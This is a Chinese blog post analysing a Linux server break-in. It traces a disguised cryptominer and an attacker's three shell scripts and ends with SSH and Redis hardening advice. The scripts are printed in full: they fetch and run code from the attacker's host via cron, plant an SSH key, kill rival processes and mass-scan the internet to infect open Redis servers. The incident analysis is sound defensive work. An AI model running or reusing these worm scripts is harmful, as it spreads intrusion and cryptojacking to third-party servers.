
---
title: '记一次Linux被入侵全过程'
categories: 
 - 编程
 - Dockone
 - 周报
headimg: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/cbb22afd8a3fd0b9fbd4b631cdbaed48.jpg'
author: Dockone
comments: false
date: 2021-09-09 07:08:25
thumbnail: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/cbb22afd8a3fd0b9fbd4b631cdbaed48.jpg'
---

<div>   
<br><h3>背景</h3>周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，SSH连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名：root，还有不足8位的小白密码，心里一凉：被黑了！<br>
<h3>查找线索</h3>服务器系统CentOS 6.X，部署了Nginx，Tomcat，Redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/cbb22afd8a3fd0b9fbd4b631cdbaed48.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/cbb22afd8a3fd0b9fbd4b631cdbaed48.jpg" class="img-polaroid" title="1.jpg" alt="1.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
Google了一下GPG，结果是：<br>
<br><blockquote><br>GPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。</blockquote>看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来Windows上各种看起来像svchost.exe的病毒。继续：<br>
<pre class="prettyprint">ps eho command -p 23374<br>
netstat -pan | grep 23374<br>
</pre><br>
查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：<br>
<ol><li>文件是怎么上传的？  </li><li>这个文件的目的是什么，或是黑客想干嘛？</li></ol><br>
<br>history看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/ba4c2fa17ff44fb3b7aa3c2bccd0d10d.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/ba4c2fa17ff44fb3b7aa3c2bccd0d10d.jpg" class="img-polaroid" title="2.jpg" alt="2.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。<br>
<pre class="prettyprint">crontab -e<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/91b334836dd42718e5fba65a92aa7f39.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/91b334836dd42718e5fba65a92aa7f39.jpg" class="img-polaroid" title="3.jpg" alt="3.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
果然，线索找到了。<br>
<h3>作案动机</h3>上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。<br>
<pre class="prettyprint">curl -fsSL 159.89.190.243/ash.php > ash.sh<br>
</pre><br>
脚本内容如下：<br>
<pre class="prettyprint">uname -a<br>
id<br>
hostname<br>
setenforce 0 2>/dev/null<br>
ulimit -n 50000<br>
ulimit -u 50000<br>
crontab -r 2>/dev/null<br>
rm -rf /var/spool/cron/* 2>/dev/null<br>
mkdir -p /var/spool/cron/crontabs 2>/dev/null<br>
mkdir -p /root/.ssh 2>/dev/null<br>
echo 'ssh-rsa<br>
<br>
AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx<br>
redisX' > /root/.ssh/authorized_keys<br>
echo '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/root<br>
echo '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/crontabs/root<br>
<br>
yum install -y bash 2>/dev/null<br>
apt install -y bash 2>/dev/null<br>
apt-get install -y bash 2>/dev/null<br>
<br>
bash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2>/dev/null<br>
</pre><br>
大致分析一下该脚本的主要用途：<br>
<br>首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成SSH公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章：《<a href="https://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">SSH原理与运用</a>》。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。<br>
<br>继续下载并分析bsh.pbp，内容如下：<br>
<pre class="prettyprint">sleep $( seq 3 7 | sort -R | head -n1 )<br>
cd /tmp || cd /var/tmp<br>
sleep 1<br>
mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...<br>
sleep 1<br>
if [ -f .watch ]; then<br>
rm -rf .watch<br>
exit 0<br>
fi<br>
sleep 1<br>
echo 1 > .watch<br>
sleep 1<br>
ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ &#123;print $1&#125;' | xargs kill -9 2>/dev/null<br>
ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ &#123;print $1&#125;' | xargs kill -9 2>/dev/null<br>
sleep 1<br>
if ! [ -x /usr/bin/gpg-agentd ]; then<br>
curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db<br>
echo '/usr/bin/gpg-agentd' > /etc/rc.local<br>
echo 'curl -fsSL 159.89.190.243/ash.php|sh' >> /etc/rc.local<br>
echo 'exit 0' >> /etc/rc.local<br>
fi<br>
sleep 1<br>
chmod +x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd<br>
sleep 1<br>
if ! [ -x "$(command -v masscan)" ]; then<br>
rm -rf /var/lib/apt/lists/*<br>
rm -rf x1.tar.gz<br>
if [ -x "$(command -v apt-get)" ]; then<br>
export DEBIAN_FRONTEND=noninteractive<br>
apt-get update -y<br>
apt-get install -y debconf-doc<br>
apt-get install -y build-essential<br>
apt-get install -y libpcap0.8-dev libpcap0.8<br>
apt-get install -y libpcap*<br>
apt-get install -y make gcc git<br>
apt-get install -y redis-server<br>
apt-get install -y redis-tools<br>
apt-get install -y redis<br>
apt-get install -y iptables<br>
apt-get install -y wget curl<br>
fi<br>
if [ -x "$(command -v yum)" ]; then<br>
yum update -y<br>
yum install -y epel-release<br>
yum update -y<br>
yum install -y git iptables make gcc redis libpcap libpcap-devel<br>
yum install -y wget curl<br>
fi<br>
sleep 1<br>
curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz<br>
sleep 1<br>
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4<br>
fi<br>
sleep 3 && rm -rf .watch<br>
bash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2>/dev/null<br>
</pre><br>
这段脚本的代码比较长，但主要的功能有4个：<br>
<ol><li>下载远程代码到本地，添加执行权限，chmod u+x。  </li><li>修改rc.local，让本地代码开机自动执行。  </li><li>下载GitHub上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。  </li><li>下载第三个脚本，并且执行。</li></ol><br>
<br>我去GitHub上看了下这个开源代码，简直吊炸天。<br>
<br><blockquote><br>MASSCAN: Mass IP port scanner<br><br>
  This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second.<br>
  It produces results similar to nmap, the most famous port scanner.<br><br>
  Internally, it uses asynchronous transmission, similar to port scanners like <code class="prettyprint">scanrand</code>, <code class="prettyprint">unicornscan</code>, and <code class="prettyprint">ZMap</code>. It's more flexible, allowing arbitrary port and address ranges.<br>
  NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.</blockquote>transmitting 10 million packets per second（每秒发送1000万个数据包），比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。<br>
<pre class="prettyprint">setenforce 0 2>/dev/null<br>
ulimit -n 50000<br>
ulimit -u 50000<br>
sleep 1<br>
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null<br>
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null<br>
sleep 1<br>
rm -rf .dat .shard .ranges .lan 2>/dev/null<br>
sleep 1<br>
echo 'config set dbfilename "backup.db"' > .dat<br>
echo 'save' >> .dat<br>
echo 'flushall' >> .dat<br>
echo 'set backup1 "\n\n\n*/2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh\n\n"' >> .dat<br>
echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh\n\n"' >> .dat<br>
echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh\n\n"' >> .dat<br>
echo 'set backup4 "\n\n\n*/5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh\n\n"' >> .dat<br>
echo 'config set dir "/var/spool/cron/"' >> .dat<br>
echo 'config set dbfilename "root"' >> .dat<br>
echo 'save' >> .dat<br>
echo 'config set dir "/var/spool/cron/crontabs"' >> .dat<br>
echo 'save' >> .dat<br>
sleep 1<br>
masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq > .shard<br>
sleep 1<br>
while read -r h p; do<br>
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &<br>
done < .shard<br>
sleep 1<br>
masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq > .ranges<br>
sleep 1<br>
while read -r h p; do<br>
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &<br>
done < .ranges<br>
sleep 1<br>
ip a | grep -oE '([0-9]&#123;1,3&#125;.?)&#123;4&#125;/[0-9]&#123;2&#125;' 2>/dev/null | sed 's/\/\([0-9]\&#123;2\&#125;\)/\/16/g' > .inet<br>
sleep 1<br>
masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq > .lan<br>
sleep 1<br>
while read -r h p; do<br>
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &<br>
done < .lan<br>
sleep 60<br>
rm -rf .dat .shard .ranges .lan 2>/dev/null<br>
</pre><br>
如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。<br>
<br>一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过Redis的人，应该能猜到，这里是对Redis进行配置。写这个配置，自然也就是利用了Redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描Redis服务器，寻找肉鸡，注意看这6379就是Redis服务器的默认端口，如果你的Redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。<br><br>
<h3>总结</h3>通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key拿到登录权限，然后下载执行远程二进制文件，最后再通过Redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：<br><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/5e9861517cabdb7728c990f558191879.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/5e9861517cabdb7728c990f558191879.jpg" class="img-polaroid" title="4.jpg" alt="4.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin，eth，mine等相关单词，最终发现了这个：<br><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/2b0cc4b2fb200cca403041c2597afffd.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/2b0cc4b2fb200cca403041c2597afffd.jpg" class="img-polaroid" title="5.jpg" alt="5.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
打开<a href="http://nicehash.com/" rel="nofollow" target="_blank">http://nicehash.com</a>看一下，一切都清晰了。<br><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210908/e3a7562e6fa86c7d46213f04f58f8a5f.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210908/e3a7562e6fa86c7d46213f04f58f8a5f.jpg" class="img-polaroid" title="6.jpg" alt="6.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h3>安全建议</h3><h4>服务器</h4><ol><li>禁用ROOT  </li><li>用户名和密码尽量复杂  </li><li>修改SSH的默认22端口  </li><li>安装DenyHosts防暴力破解软件  </li><li>禁用密码登录，使用RSA公钥登录</li></ol><br>
<br><h4>Redis</h4><ol><li>禁用公网IP监听，包括0.0.0.0  </li><li>使用密码限制访问Redis  </li><li>使用较低权限帐号运行Redis</li></ol><br>
<br>到此，整个入侵过程基本分析完了，如果大家对样本有兴趣，也可以自行去curl，或是去虚拟机执行上面的脚本。鉴于本人能力有限，文中难免会出现疏忽或是错误，还请大家多多指正。<br>
<br>文章来源：看雪论坛，作者：Hefe
                                                                <div class="aw-upload-img-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                </div>
                                
                                                                <ul class="aw-upload-file-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </ul>
                                                              
</div>
            